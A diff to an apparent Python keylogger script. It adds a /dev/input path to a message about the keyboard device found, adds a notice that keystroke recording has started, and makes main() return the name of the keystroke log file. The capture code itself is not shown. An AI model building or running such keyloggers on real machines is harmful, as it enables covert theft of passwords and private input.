@@ -271,7 +271,7 @@ def __get_kb_event(password: str, cmd: str):
 
                 if closest_match:
                     index = parsed_line.index(closest_match[0])
-                    print(f"[+] Keyboard event found in: {closest_match[0]}")
+                    print(f"[+] Keyboard event found in: /dev/input/{closest_match[0]}")
                     event_x = parsed_line[index]
                 else:
                     sys.exit("[+] ERROR: No keyboard device has been found! (Now terminating program...)")
@@ -300,6 +300,9 @@ def __perform_keylog(event_x: str,
     :return buffer:
             A string containing the user recorded keystrokes
     """
+    # Print instructions
+    print("[+] Keylogger now recording keystrokes and the recorded keys will be placed in .txt file...")
+
     # Initialize empty buffer
     buffer = ""
 
@@ -381,6 +384,8 @@ def main():
 
         # d) Create a new .txt file to record and log keystrokes (with rwx permissions)
         __create_write_to_keylog_file(file_name, keylog_buffer)
+
+        return file_name
 
     except KeyboardInterrupt as e:
         print("[+] KEYLOGGER STOPPED: A KeyboardInterrupt was called (program now terminating...)")
